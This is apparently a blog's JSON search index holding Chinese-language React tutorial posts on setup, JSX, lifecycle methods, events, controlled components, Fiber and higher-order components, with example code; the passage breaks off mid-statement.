[{"title":"React 概念","url":"/2019/10/20/React/React-01-%E6%A6%82%E5%BF%B5/","content":"一、什么是react\nreact是由Facebook开发的一个JavaScript库，而不是一个框架。当时Facebook需要解决一个问题，开发（或者说是构建）一个数据不断变化的大型应用。而数据变化会带来两个很严重的问题\n\n二、react的特点\n简单：学习简单，代码简单\n声明式（编程）：自动DOM操作\n\n\nReact的核心是组件，组件的设计目的是提升代码的复用率、降低测试难度和代码复杂度。\n\n\n提高代码复用率：组件将数据与逻辑封装\n降低测试难度：组件高内聚低耦合，很容易对单个组件进行测试\n降低代码复杂度：使用JSX语法，更直观的在js文件中看HTML代码，提高可读性\n\n三、react的开发环境的配置\n如果是要直接在HTML上编辑，需要下载react.js与react-dom.js。如果要使用JSX语法，则需要使用转换JSX语法的插件。这里使用brower.js。在线地址：https://cdnjs.cloudflare.com/ajax/libs/babel-core/5.8.23/browser.min.js\n\n\nreact.js：react的核心库\nreact-dom.js：提供操作DOM相关的功能\nbrower,js：将使用的JSX语法转换成JavaScript语法\n\n\n注意：三者引用顺序必须是react、react-dom、brower\n\n四、React、ReactDOM中有什么\n五、yeoman环境\nyeoman前端脚手架工具\n\ncnpm i -g yeoman\n\n\nhttp://yeoman.io/\n\n\nhttps://github.com/react-webpack-generators/generator-react-webpack#readme\n# Make sure both is installed globallynpm install -g yonpm install -g generator-react-webpack# Create a new directory, and `cd` into it:mkdir my-new-project &amp;&amp; cd my-new-project# Run the generatoryo react-webpack\n\n# Start for developmentnpm start # ornpm run serve# Start the dev-server with the dist versionnpm run serve:dist# Just build the dist version and copy static filesnpm run dist# Run unit testsnpm test# Auto-run unit tests on file changesnpm run test:watch# Lint all files in src (also automatically done AFTER tests are run)npm run lint# Clean up the dist directorynpm run clean# Just copy the static assetsnpm run copy\n\n六、React脚手架搭建npm i create-react-appcreate-react-app your-app-name &amp;&amp; cd your-app-namenpm install npm start","categories":["框架"],"tags":["React"]},{"title":"React 声明周期","url":"/2019/11/04/React/React-03-%E5%A3%B0%E6%98%8E%E5%91%A8%E6%9C%9F/","content":"一、什么是生命周期\n\n组件本质是状态机，输入确定，输出一定确定\n一个state对应一个render，状态转换的时候会触发不同的函数，从而让开发者有机会做出响应，可以用事件的思路理解状态，但是事件与事件之间没有关联，而状态与状态之间可能会有关联\n\n\n二、初始化阶段设置初始的属性与状态\n\ngetDefaultProps：设置初始的属性，只在第一次调用，实例之间共享引用\ngetInitialState：设置初始的状态\ncomponentWillMount：组件将要加载，render之前最后一次修改状态的机会\nrender：只能访问this.props与this.state，只有一个顶层标签（组件），不允许修改状态和DOM输出\ncomponentDidMount：成功render并渲染完成真实DOM之后出发，可以修改DOM，要操作DOM也必须在这个阶段完成\n\nvar Demo = React.createClass(&#123;    // 第一步执行顺序：设置初始的属性，指执行一次    getDefaultProps:function()&#123;        return &#123;            name:&#x27;一个盒子&#x27;,            title:&#x27;box&#x27;        &#125;    &#125;,    // 第二步执行顺序：设置初始的状态    getInitialState:function()&#123;        return &#123;            sss: this.props.name        &#125;    &#125;,    // 第三步执行：组件将要加载的时候，最后一次可以修改状态的机会    componentWillMount:function()&#123;        this.setState(&#123;            sss:&#x27;修改状态&#x27;        &#125;)        // alert(&#x27;componentWillMount&#x27;)        // 这里是没有办法获取到这个节点的        // var box = this.refs.box;        // alert(box.clientWidth)    &#125;,    // 第四步：render渲染    render:function()&#123;        // console.log(this)        var styles = &#123;            position:&#x27;absolute&#x27;,            width: &#x27;100px&#x27;,            height: &#x27;100px&#x27;,            color: &#x27;red&#x27;,            background: &#x27;lime&#x27;        &#125;        return &lt;div ref=&quot;box&quot; style=&#123;styles&#125;&gt;&#123;this.props.title&#125;&#123;this.state.sss&#125;&lt;/div&gt;    &#125;,    // 第五步：组件加载完成，只有在这一个阶段，我们才可以操作DOM节点    componentDidMount:function()&#123;        // alert(&#x27;componentDidMount&#x27;)        // 下面的this指向组件        console.log(this)        var box = this.refs.box;        var timer = null;        var n = 0;        box.onclick = function()&#123;            console.log(1)            // 这个this指向box            console.log(this)            var This = this;            timer = setInterval(function()&#123;                // 这个this指向window                // console.log(this)                n++;                This.style.left = n + &#x27;px&#x27;;                This.style.top = n + &#x27;px&#x27;;            &#125;,60)        &#125;    &#125;&#125;)ReactDOM.render(&lt;Demo/&gt;,document.getElementById(&quot;app&quot;))\n\n三、运行中阶段\ncomponentWillReceiveProps：父组件修改属性触发，可以修改新属性，修改状态\nshouldCompoenntUpdate：组件是否更新，返回false会阻止render调用，render后面的函数都不会执行\ncomponentWillUpdate：不能修改属性与状态，用于日志打印与数据获取\nreder：只能访问this.props与this.state，只有一个顶层标签（组件），不允许修改状态和DOM输出\ncomponentDidUpdate：可以修改DOM\n\nvar HelloReact = React.createClass(&#123;    // 组件将要接收新的属性    componentWillReceiveProps:function(newProps)&#123;        console.log(&#x27;componnetWillReceiveProps&#x27;,1)        console.log(newProps)    &#125;,    // 是否允许组件更新，返回true或者false，一般不会改变它的默认值：true    shouldComponentUpdate:function(newProps,newState)&#123;        console.log(&#x27;shouldComponentUpdate&#x27;,2)        console.log(newProps,newState)        return true;    &#125;,    // 组件将要更新    componentWillUpdate:function()&#123;        console.log(&#x27;componentWillUpdate&#x27;,3)    &#125;,    render:function()&#123;        console.log(&#x27;render&#x27;,4)        return &lt;p&gt;Hello &#123;this.props.name?this.props.name:&#x27;React&#x27;&#125;&lt;/p&gt;    &#125;,    // 组件更新完毕    componentDidUpdate:function()&#123;        console.log(&#x27;componentDidUpdate&#x27;,5)    &#125;&#125;)var Demo = React.createClass(&#123;    getInitialState:function()&#123;        return &#123;            name:&#x27;&#x27;        &#125;    &#125;,    handleChange:function(e)&#123;        this.setState(&#123;            name:e.target.value        &#125;)    &#125;,    render:function()&#123;         return(            &lt;div&gt;                &lt;HelloReact name=&#123;this.state.name&#125;/&gt;                &lt;input type=&quot;text&quot; onChange=&#123;this.handleChange&#125; /&gt;            &lt;/div&gt;        )    &#125;&#125;)ReactDOM.render(&lt;Demo/&gt;,document.getElementById(&quot;app&quot;))\n\n四、销毁阶段\ncomponentWillUnmount：组件将要卸载\n在ReactDOM中提供一个方法unmountComponentAtNode(删除节点的名字)\n\nvar HelloReact = React.createClass(&#123;    // 组件将要接收新的属性    componentWillReceiveProps:function(newProps)&#123;        console.log(&#x27;componnetWillReceiveProps&#x27;,1)        console.log(newProps)    &#125;,    // 是否允许组件更新，返回true或者false，一般不会改变它的默认值：true    shouldComponentUpdate:function(newProps,newState)&#123;        console.log(&#x27;shouldComponentUpdate&#x27;,2)        console.log(newProps,newState)        return true;    &#125;,    // 组件将要更新    componentWillUpdate:function()&#123;        console.log(&#x27;componentWillUpdate&#x27;,3)    &#125;,    render:function()&#123;        console.log(&#x27;render&#x27;,4)        return &lt;p&gt;Hello &#123;this.props.name?this.props.name:&#x27;React&#x27;&#125;&lt;/p&gt;    &#125;,    // 组件更新完毕    componentDidUpdate:function()&#123;        console.log(&#x27;componentDidUpdate&#x27;,5)    &#125;,    componentWillUnmount:function()&#123;        console.log(&#x27;BOOOOOOOOOOOOOOOOOM&#x27;)    &#125;&#125;)var Demo = React.createClass(&#123;    getInitialState:function()&#123;        return &#123;            name:&#x27;&#x27;        &#125;    &#125;,    handleChange:function(e)&#123;        // 利用input输入的内容来卸载组件        if(e.target.value == &#x27;1234&#x27;)&#123;            ReactDOM.unmountComponentAtNode(document.getElementById(&quot;app&quot;))            // 写上这个return是为了不执行下面的语句，减少代码执行时间            return ;        &#125;        this.setState(&#123;            name:e.target.value        &#125;)    &#125;,    render:function()&#123;        // 通过判断state的状态来卸载组件       /* if( this.state.name == &#x27;1234&#x27;)&#123;            return &lt;div&gt;1234&lt;/div&gt;        &#125;*/        return(            &lt;div&gt;                &lt;HelloReact name=&#123;this.state.name&#125;/&gt;                &lt;input type=&quot;text&quot; onChange=&#123;this.handleChange&#125; /&gt;            &lt;/div&gt;        )    &#125;&#125;)ReactDOM.render(&lt;Demo/&gt;,document.getElementById(&quot;app&quot;))\n\n\n\n\n\n五、总结新版生命周期整体流程如下图所示：\n\n旧的生命周期流程图如下：\n\n通过两个图的对比，可以发现新版的生命周期减少了以下三种方法：\n\ncomponentWillMount\ncomponentWillReceiveProps\ncomponentWillUpdate\n\n其实这三个方法仍然存在，只是在前者加上了UNSAFE_前缀，如UNSAFE_componentWillMount，并不像字面意思那样表示不安全，而是表示这些生命周期的代码可能在未来的 react版本可能废除\n同时也新增了两个生命周期函数：\n\ngetDerivedStateFromProps\ngetSnapshotBeforeUpdate\n\n","categories":["框架"],"tags":["React"]},{"title":"React 组件协议(不)可控组件","url":"/2019/11/28/React/React-05-%E7%BB%84%E4%BB%B6%E5%8D%8F%E5%90%8C(%E4%B8%8D)%E5%8F%AF%E6%8E%A7%E7%BB%84%E4%BB%B6/","content":"一、为什么要进行组件的协同\n我们在实际的开发项目的时候，不会只用几个组件，有时候遇到大型的项目，可能会有成千上百的组件，难免会遇到有功能重复的组件。要进行修改，就会修改大部分的文件。所以我们需要进行组件的协同开发。\n\n\n二、什么是组件的协同使用？\n组件的协同本质上是对组件的一种组织、管理的方式。\n目的：\n逻辑清晰：这是组件与组件之间的逻辑\n代码模块化\n封装细节：像面向对象一样将常用的方法以及数据封装起来\n提高代码的复用性：因为是组件，相当于一个封装好的东西，用的时候直接调用\n\n\n\n三、如何实现组件的协同使用\n第一种：增加一个父组件，将其他的组件进行嵌套，更多的是实现代码的封装\n第二种：通过一些操作从后台获取数据，React中的Mixin，更多的是实现代码的复用\n\n四、组件嵌套的含义\n组件嵌套的本质是父子关系\n\n\n五、组件嵌套的优缺点\n优点：\n逻辑清晰：父子关系类似于人类中的父子关系\n模块化开发：每个模块对应一个功能，不同的模块可以同步开发\n封装细节：开发者必须要关注组件的功能，不需要了解细节\n\n\n缺点：\n编写难度高：父子组件的关系需要经过深思熟虑，贸然编写可能导致关系混乱，代码难以维护\n无法掌握所有细节：使用者只知道组件的用法，不知道实现细节，遇到问题难以修复\n\n\n\n六、MixinMixin的含义\n\nMixin=一组方法。\n他的目的是横向抽离出组件的相似代码，把组件的共同作用以及效果的代码提出来\n\n\nMixin的优缺点\n\n优点\n代码复用：抽离出通用的代码，减少开发成本，提高开发效率\n即插即用：可以使用许多现有的Mixin来开发自己的代码\n适应性强：改动一次代码，影响多个组件\n\n\n缺点\n编写难度高：Mixin可能被用在各种环境中，想要兼容多种环境就需要更多的 - 码与逻辑，通用的代价是提高复杂度\n降低代码的可读性：组件的优势在于将逻辑与是界面直接结合在一起，Mixin本质上会分散逻辑，理解起来难度大\n\n\n\n七、不可控组件\n\n上图：defaultValue的值是固定的，这就是一个不可控组件\n如果要获取input的value值，只有使用ref获取节点来获取值\n\n八、可控组件\n\ndefaultValue的值是根据状态确定了，只需要拿到this.state.value的值就可以了\n这里需要注意一下：使用value的值是不可修改的，defaultValue的值是可以修改的\n\n可控组件的优点\n\n符合React的数据流\n数据存储在state中，便于获取\n便于处理数据\n\n","categories":["框架"],"tags":["React"]},{"title":"React-jsx与非DOM","url":"/2019/10/26/React/React-02-jsx%E4%B8%8E%E9%9D%9EDOM/","content":"一、JSX是什么\n一个语法或者说是语法糖\n基于ECMAScript一种新的特性\n一种定义带属性（DOM节点）树结构（DOM结构）的语法\n\nJSX不是\n\n一门新的语言\nXML或者HTML\n一种限制，可以不使用JSX\n\n二、JSX的特点\n类XML语法，易于接受\n增强JS语义，在js中编辑HTML\n结构清晰\n抽象程度高（核心）：避免手动DOM操作，跨平台\n代码模块化\n\n三、JSX语法\n/*    JSX（javaScriptXML）语法入门：        1、不是一门语言，是一个语法或者说是语法糖        2、JSX标签其实就是HTML标签，只不过在javascript中这些标签的时候，            不使用“”,遇到HTML标签（以&lt;开始），就用HTML规则解析，遇到代码块            （以&#123;开始），就用javascript规则解析        3、JSX语法浏览器无法解析，需要使用插件将其转化为js代码        4、代码更加直观*//*    1、首字母必须大写    2、驼峰命名    3、使用className与htmlFor代替class和for    4、组件与组件之间是可以嵌套的    5、在JSX语法中只能使用求值表达式，不能使用语句    6、只有一个顶层标签*/var Demo = React.createClass(&#123;    change:function ()&#123;        return &#x27;demo&#x27;    &#125;,    handleClick:function()&#123;        alert(1)    &#125;,    render: function()&#123;        // this指向整个（当前的组件）组件        return &lt;div className=&quot;demo&quot; onClick=&#123;this.handleClick&#125;&gt;这是一个&#123;this.change()&#125;&lt;/div&gt;    &#125;&#125;)// console.log(Demo)ReactDOM.render(&lt;Demo /&gt;,document.getElementById(&#x27;app&#x27;))\n\n四、JSX的注释\n在JSX语法中，添加注释需要写在 &#123; &#125; 中\n可以使用多行注释与单行注释\n\nvar HelloWorld = React.createClass(&#123;    render:function()&#123;        // 现在这里是属于js的部分,不属于JSX语法的部分        return (            &lt;div className=&quot;box&quot; // class名字            &gt;                &#123;/*这是一个标题*/&#125;                &lt;h1 className=&quot;title&quot;&gt;Hello World&lt;/h1&gt;                &#123;/*这是说明*/&#125;                &lt;p&gt;你好世界！&lt;/p&gt;                &lt;div className=&quot;box2&quot;&gt;你好&lt;/div&gt;            &lt;/div&gt;        )    &#125;&#125;)ReactDOM.render(&lt;HelloWorld/&gt;,document.getElementById(&quot;app&quot;))\n\n五、JSX中使用样式\n内联样式\n对象样式\n选择器样式（CSS样式）\n\n/*组件的样式:    1、行内样式：写行内样式的时候需要使用两个&#123;&#125;  ==&gt;&#123;&#123;&#125;&#125;    2、对象样式：在return前面定义一个样式对象，注意样式的写法，与HTML的不同点    3、CSS样式注意事项，在HTML5中与在React中的样式的书写区别：    1、HTML5中以;结束        在React中以,结束    2、在HTML5中属性与值都不需要加上引号        在React中，属于javascript对象，key中不能存在 - ,        需要使用驼峰命名，如果是value值，需要加上引号    3、在HTML中，设置带数字的值，宽度，高度==，需要带上单位        在React中可以不用带单位，直接写数字        这里是指那些规定了默认单位的值。比如说像素px，如果要使用em或者是rem则需要加上单位*//*&#123;&#125; 插值符号在使用插值符号的是有，里面需要时一个对象或者是一个表达式*/var HelloWorld = React.createClass(&#123;render:function()&#123;    var styles = &#123;        color: &#x27;blue&#x27;,        fontSize: &#x27;30&#x27;    &#125;    return (        &lt;div className=&quot;box&quot;&gt;            &lt;h3 className=&quot;title&quot; style=&#123;&#123;color:&#x27;red&#x27;,backgroundColor:&#x27;lime&#x27;&#125;&#125;&gt;默认标题&lt;/h3&gt;            &lt;p className=&quot;subtitle&quot; style=&#123;styles&#125;&gt;说明&lt;/p&gt;            &lt;p className=&quot;details&quot;&gt;这个是用来教学的案例&lt;/p&gt;        &lt;/div&gt;    )&#125;&#125;)ReactDOM.render(&lt;HelloWorld/&gt;,document.getElementById(&quot;app&quot;))\n\n六、条件判断的四种写法\n三元表达式 ? :\n使用变量，通过函数使用条件判断语句，返回一个字符串\n直接在&#123;&#125;中调用函数\n使用比较运算符 &amp;&amp; ||！&#96;\n\n/*1、三元表达式\t\t?\t:2、使用变量，通过函数使用条件判断语句，返回一个字符串3、直接在&#123;&#125;中调用函数4、使用比较运算符\t&amp;&amp;   ||  ！*/var Demo = React.createClass(&#123;    // 设置初始的状态    getInitialState:function()&#123;        return &#123;            onOff:true        &#125;    &#125;,    // 自定义一个点击事件    handleClick:function() &#123;        this.setState(&#123;            onOff:!this.state.onOff        &#125;)    &#125;,    render:function()&#123;        return &lt;div className=&#123;this.state.onOff?&quot;box2&quot;:&quot;box1&quot;&#125; onClick=&#123;this.handleClick&#125;&gt;我是一个盒子&lt;/div&gt;    &#125;&#125;)ReactDOM.render(&lt;Demo/&gt;,document.body)\n\n七、非DOM（元素）属性\ndangerouslySetInnerHTML：在JSX中直接插入HTML代码，动态的添加HTML内容，由用户添加。需要使用属性，__html\nref：父组件引用子组件 this.refs.name\nkey：目的提高渲染性能 ，涉及到React diff算法，React通过key值判断是否重新渲染\n\n","categories":["框架"],"tags":["React"]},{"title":"React 事件","url":"/2019/11/17/React/React-04-%E4%BA%8B%E4%BB%B6/","content":"一、编写事件处理函数\n\n在函数体中进行一些操作，常见的有：更新页面内容，更新组件状态，与后台交互\n\n\n书写方式\nvar Demo = React.createClass(&#123;\t\tgetInitialState:function()&#123;\t\t&#125;,\t\thandleClick: function(event)&#123;\t\t&#125;,\t\thandleChange: function()&#123;\t\t&#125;,\t\trender:function()&#123;\t\t&#125;,\t&#125;)\n\n\n上面的代码中有的有参数event，有的没有，这个根据自己的需求\n\n二、绑定事件处理函数\nonClick=&#123;this,handleClick&#125;\n需要注意的是：不要在事件后面添加上一个（）\n\n其他的事件\n\n触摸事件：onTouchCancel，onTouchEnd，onTouchMove，onTouchStart\n键盘事件：onKeyDown，onKeyUp， onKeyPress（前两者的组合）\n表单时间：onChange，onInput，onSubmit\n焦点事件：onFocus，onBlur\nUI元素事件：onScroll\n滚动事件：onWhell（鼠标滚动）\n鼠标事件：onClick，onContextMenu，onDoubleClick……\n\nvar Demo = React.createClass(&#123;    handleClick:function(e)&#123;        console.log(e)        console.log(e.target)        console.log(e.nativeEvent)    &#125;,    render:function()&#123;        return &lt;div onClick=&#123;this.handleClick&#125;&gt;Hello World&lt;/div&gt;    &#125;&#125;)ReactDOM.render(&lt;Demo/&gt;,document.getElementById(&#x27;app&#x27;))var Demo = React.createClass(&#123;    getInitialState:function()&#123;        return &#123;            width: 200,            height: 200,            backgroundColor: &#x27;#DDDDDD&#x27;        &#125;    &#125;,    /*handleWheel:function(e)&#123;        var newColor = (parseInt(this.state.backgroundColor.substr(1),16) + e.deltaY).toString(16)        newColor = &#x27;#&#x27; + newColor.toUpperCase()        console.log(newColor)        this.setState(&#123;            backgroundColor:newColor        &#125;)    &#125;,*/    randomColor:function()&#123;        var r = Math.floor(Math.random()*256);        var g = Math.floor(Math.random()*256);        var b = Math.floor(Math.random()*256);        return &#x27;rgb(&#x27;+r+&#x27;,&#x27;+g+&#x27;,&#x27;+b+&#x27;)&#x27;    &#125;,    handleWheel:function()&#123;        this.setState(&#123;            backgroundColor:this.randomColor()        &#125;)    &#125;,    render:function()&#123;        return &lt;div onWheel=&#123;this.handleWheel&#125; style=&#123;this.state&#125;&gt;这是一个案例，鼠标滚动实现背景颜色的变化&lt;/div&gt;    &#125;&#125;)ReactDOM.render(&lt;Demo/&gt;,document.getElementById(&#x27;app&#x27;))\n\n三、事件对象事件对象的使用\n\n通用：所有的事件都有事件属性\n\n\n\n键盘：键盘事件拥有的事件属性\n\n\n\n鼠标：鼠标事件拥有的事件属性\n\n\n\n滚动：滚动事件拥有的事件属性\n为什么会有三个，因为有的设备可以实现三个方向的移动\n\n\n\n\n四、事件与状态关联inputChange:function(event)&#123;    this.setState(&#123;    \tinputText:event.target.value    &#125;)&#125;\n\n\n总的来说就是使用this.setState来更新状态，而状态的值因为事件的不同会不同\n\n","categories":["React"],"tags":["React"]},{"title":"React Fiber","url":"/2020/01/07/React/React-Fiber/","content":"\nReact Fiber是对核心算法的一次重新实现。React Fiber把更新过程碎片化，把一个耗时长的任务分成很多小片，每一个小片的运行时间很短，虽然总时间依然很长，但是在每个小片执行完之后，都给其他任务一个执行的机会，这样唯一的线程就不会被独占，其他任务依然有运行的机会\n\n\n在React Fiber中，一次更新过程会分成多个分片完成，所以完全有可能一个更新任务还没有完成，就被另一个更高优先级的更新过程打断，这时候，优先级高的更新任务会优先处理完，而低优先级更新任务所做的工作则会完全作废，然后等待机会重头再来\n因为一个更新过程可能被打断，所以React Fiber一个更新过程被分为两个阶段(Phase)：第一个阶段Reconciliation Phase和第二阶段Commit Phase\n在第一阶段Reconciliation Phase，React Fiber会找出需要更新哪些DOM，这个阶段是可以被打断的；但是到了第二阶段Commit Phase，那就一鼓作气把DOM更新完，绝不会被打断\n这两个阶段大部分工作都是React Fiber做，和我们相关的也就是生命周期函数\n\n\nReact Fiber改变了之前react的组件渲染机制，新的架构使原来同步渲染的组件现在可以异步化，可中途中断渲染，执行更高优先级的任务。释放浏览器主线程\n\n关键特性\n\n增量渲染（把渲染任务拆分成块，匀到多帧）\n更新时能够暂停，终止，复用渲染任务\n给不同类型的更新赋予优先级\n并发方面新的基础能力\n\n\n增量渲染用来解决掉帧的问题，渲染任务拆分之后，每次只做一小段，做完一段就把时间控制权交还给主线程，而不像之前长时间占用\n\n二、组件的渲染顺序\n假如有A,B,C,D组件，层级结构为：\n\n\n我们知道组件的生命周期为：\n挂载阶段：\n\nconstructor()\ncomponentWillMount()\nrender()\ncomponentDidMount()\n\n更新阶段为：\n\ncomponentWillReceiveProps()\nshouldComponentUpdate()\ncomponentWillUpdate()\nrender()\ncomponentDidUpdate\n\n\n那么在挂载阶段，A,B,C,D的生命周期渲染顺序是如何的呢？\n\n那么在挂载阶段，A,B,C,D的生命周期渲染顺序是如何的呢？\n\n\n以render()函数为分界线。从顶层组件开始，一直往下，直至最底层子组件。然后再往上\n\n组件update阶段同理\n前面是react16以前的组建渲染方式。这就存在一个问题\n\n如果这是一个很大，层级很深的组件，react渲染它需要几十甚至几百毫秒，在这期间，react会一直占用浏览器主线程，任何其他的操作（包括用户的点击，鼠标移动等操作）都无法执行\n\nFiber架构就是为了解决这个问题\n\n看一下fiber架构 组建的渲染顺序\n\n\n加入fiber的react将组件更新分为两个时期\n\n这两个时期以render为分界\n\nrender前的生命周期为phase1,\nrender后的生命周期为phase2\n\n\n\nphase1的生命周期是可以被打断的，每隔一段时间它会跳出当前渲染进程，去确定是否有其他更重要的任务。此过程，React在 workingProgressTree （并不是真实的virtualDomTree）上复用 current 上的 Fiber 数据结构来一步地（通过requestIdleCallback）来构建新的 tree，标记处需要更新的节点，放入队列中\nphase2的生命周期是不可被打断的，React 将其所有的变更一次性更新到DOM上\n\n\n这里最重要的是phase1这是时期所做的事。因此我们需要具体了解phase1的机制\n\n如果不被打断，那么phase1执行完会直接进入render函数，构建真实的virtualDomTree\n如果组件再phase1过程中被打断，即当前组件只渲染到一半（也许是在willMount,也许是willUpdate~反正是在render之前的生命周期），那么react会怎么干呢？ react会放弃当前组件所有干到一半的事情，去做更高优先级更重要的任务（当然，也可能是用户鼠标移动，或者其他react监听之外的任务），当所有高优先级任务执行完之后，react通过callback回到之前渲染到一半的组件，从头开始渲染。（看起来放弃已经渲染完的生命周期，会有点不合理，反而会增加渲染时长，但是react确实是这么干的）\n\n所有phase1的生命周期函数都可能被执行多次，因为可能会被打断重来\n\n这样的话，就和react16版本之前有很大区别了，因为可能会被执行多次，那么我们最好就得保证phase1的生命周期每一次执行的结果都是一样的，否则就会有问题，因此，最好都是纯函数\n\n\n如果高优先级的任务一直存在，那么低优先级的任务则永远无法进行，组件永远无法继续渲染。这个问题facebook目前好像还没解决\n所以，facebook在react16增加fiber结构，其实并不是为了减少组件的渲染时间，事实上也并不会减少，最重要的是现在可以使得一些更高优先级的任务，如用户的操作能够优先执行，提高用户的体验，至少用户不会感觉到卡顿\n\n一、问题JavaScript引擎和页面渲染引擎两个线程是互斥的，当其中一个线程执行时，另一个线程只能挂起等待\n如果 JavaScript 线程长时间地占用了主线程，那么渲染层面的更新就不得不长时间地等待，界面长时间不更新，会导致页面响应度变差，用户可能会感觉到卡顿\n而这也正是 React 15 的 Stack Reconciler所面临的问题，当 React在渲染组件时，从开始到渲染完成整个过程是一气呵成的，无法中断\n如果组件较大，那么js线程会一直执行，然后等到整棵VDOM树计算完成后，才会交给渲染的线程\n这就会导致一些用户交互、动画等任务无法立即得到处理，导致卡顿的情况\n\n二、是什么React Fiber 是 Facebook 花费两年余时间对 React 做出的一个重大改变与优化，是对 React 核心算法的一次重新实现。从Facebook在 React Conf 2017 会议上确认，React Fiber 在React 16 版本发布\n在react中，主要做了以下的操作：\n\n为每个增加了优先级，优先级高的任务可以中断低优先级的任务。然后再重新，注意是重新执行优先级低的任务\n增加了异步任务，调用requestIdleCallback api，浏览器空闲的时候执行\ndom diff树变成了链表，一个dom对应两个fiber（一个链表），对应两个队列，这都是为找到被中断的任务，重新执行\n\n从架构角度来看，Fiber 是对 React核心算法（即调和过程）的重写\n从编码角度来看，Fiber是 React内部所定义的一种数据结构，它是 Fiber树结构的节点单位，也就是 React 16 新架构下的虚拟DOM\n一个 fiber就是一个 JavaScript对象，包含了元素的信息、该元素的更新操作队列、类型，其数据结构如下：\ntype Fiber = &#123;  // 用于标记fiber的WorkTag类型，主要表示当前fiber代表的组件类型如FunctionComponent、ClassComponent等  tag: WorkTag,  // ReactElement里面的key  key: null | string,  // ReactElement.type，调用`createElement`的第一个参数  elementType: any,  // The resolved function/class/ associated with this fiber.  // 表示当前代表的节点类型  type: any,  // 表示当前FiberNode对应的element组件实例  stateNode: any,  // 指向他在Fiber节点树中的`parent`，用来在处理完这个节点之后向上返回  return: Fiber | null,  // 指向自己的第一个子节点  child: Fiber | null,  // 指向自己的兄弟结构，兄弟节点的return指向同一个父节点  sibling: Fiber | null,  index: number,  ref: null | (((handle: mixed) =&gt; void) &amp; &#123; _stringRef: ?string &#125;) | RefObject,  // 当前处理过程中的组件props对象  pendingProps: any,  // 上一次渲染完成之后的props  memoizedProps: any,  // 该Fiber对应的组件产生的Update会存放在这个队列里面  updateQueue: UpdateQueue&lt;any&gt; | null,  // 上一次渲染的时候的state  memoizedState: any,  // 一个列表，存放这个Fiber依赖的context  firstContextDependency: ContextDependency&lt;mixed&gt; | null,  mode: TypeOfMode,  // Effect  // 用来记录Side Effect  effectTag: SideEffectTag,  // 单链表用来快速查找下一个side effect  nextEffect: Fiber | null,  // 子树中第一个side effect  firstEffect: Fiber | null,  // 子树中最后一个side effect  lastEffect: Fiber | null,  // 代表任务在未来的哪个时间点应该被完成，之后版本改名为 lanes  expirationTime: ExpirationTime,  // 快速确定子树中是否有不在等待的变化  childExpirationTime: ExpirationTime,  // fiber的版本池，即记录fiber更新过程，便于恢复  alternate: Fiber | null,&#125;\n\n三、如何解决Fiber把渲染更新过程拆分成多个子任务，每次只做一小部分，做完看是否还有剩余时间，如果有继续下一个任务；如果没有，挂起当前任务，将时间控制权交给主线程，等主线程不忙的时候在继续执行\n即可以中断与恢复，恢复后也可以复用之前的中间状态，并给不同的任务赋予不同的优先级，其中每个任务更新单元为 React Element 对应的 Fiber节点\n实现的上述方式的是requestIdleCallback方法\nwindow.requestIdleCallback()方法将在浏览器的空闲时段内调用的函数排队。这使开发者能够在主事件循环上执行后台和低优先级工作，而不会影响延迟关键事件，如动画和输入响应\n首先 React 中任务切割为多个步骤，分批完成。在完成一部分任务之后，将控制权交回给浏览器，让浏览器有时间再进行页面的渲染。等浏览器忙完之后有剩余时间，再继续之前 React 未完成的任务，是一种合作式调度。\n该实现过程是基于 Fiber节点实现，作为静态的数据结构来说，每个 Fiber 节点对应一个 React element，保存了该组件的类型（函数组件&#x2F;类组件&#x2F;原生组件等等）、对应的 DOM 节点等信息。\n作为动态的工作单元来说，每个 Fiber 节点保存了本次更新中该组件改变的状态、要执行的工作。\n每个 Fiber 节点有个对应的 React element，多个 Fiber节点根据如下三个属性构建一颗树：\n// 指向父级Fiber节点this.return = null// 指向子Fiber节点this.child = null// 指向右边第一个兄弟Fiber节点this.sibling = null\n\n通过这些属性就能找到下一个执行目标\n","categories":["框架"],"tags":["React"]},{"title":"React HOC高阶组件","url":"/2020/01/10/React/React-HOC%E9%AB%98%E9%98%B6%E7%BB%84%E4%BB%B6/","content":"一、是什么高阶函数（Higher-order function），至少满足下列一个条件的函数\n\n接受一个或多个函数作为输入\n输出一个函数\n\n在React中，高阶组件即接受一个或多个组件作为参数并且返回一个组件，本质也就是一个函数，并不是一个组件\nconst EnhancedComponent = highOrderComponent(WrappedComponent);\n\n上述代码中，该函数接受一个组件WrappedComponent作为参数，返回加工过的新组件EnhancedComponent\n高阶组件的这种实现方式，本质上是一个装饰者设计模式\n二、如何编写最基本的高阶组件的编写模板如下：\nimport React, &#123; Component &#125; from &#x27;react&#x27;;export default (WrappedComponent) =&gt; &#123;  return class EnhancedComponent extends Component &#123;    // do something    render() &#123;      return &lt;WrappedComponent /&gt;;    &#125;  &#125;&#125;\n\n通过对传入的原始组件 WrappedComponent 做一些你想要的操作（比如操作 props，提取 state，给原始组件包裹其他元素等），从而加工出想要的组件 EnhancedComponent\n把通用的逻辑放在高阶组件中，对组件实现一致的处理，从而实现代码的复用\n所以，高阶组件的主要功能是封装并分离组件的通用逻辑，让通用逻辑在组件间更好地被复用\n但在使用高阶组件的同时，一般遵循一些约定，如下：\n\nprops 保持一致\n你不能在函数式（无状态）组件上使用 ref 属性，因为它没有实例\n不要以任何方式改变原始组件 WrappedComponent\n透传不相关 props 属性给被包裹的组件 WrappedComponent\n不要再 render() 方法中使用高阶组件\n使用 compose 组合高阶组件\n包装显示名字以便于调试\n\n这里需要注意的是，高阶组件可以传递所有的props，但是不能传递ref\n如果向一个高阶组件添加refe引用，那么ref 指向的是最外层容器组件实例的，而不是被包裹的组件，如果需要传递refs的话，则使用React.forwardRef，如下：\nfunction withLogging(WrappedComponent) &#123;    class Enhance extends WrappedComponent &#123;        componentWillReceiveProps() &#123;            console.log(&#x27;Current props&#x27;, this.props);            console.log(&#x27;Next props&#x27;, nextProps);        &#125;        render() &#123;            const &#123;forwardedRef, ...rest&#125; = this.props;            // 把 forwardedRef 赋值给 ref            return &lt;WrappedComponent &#123;...rest&#125; ref=&#123;forwardedRef&#125; /&gt;;        &#125;    &#125;;    // React.forwardRef 方法会传入 props 和 ref 两个参数给其回调函数    // 所以这边的 ref 是由 React.forwardRef 提供的    function forwardRef(props, ref) &#123;        return &lt;Enhance &#123;...props&#125; forwardRef=&#123;ref&#125; /&gt;    &#125;    return React.forwardRef(forwardRef);&#125;const EnhancedComponent = 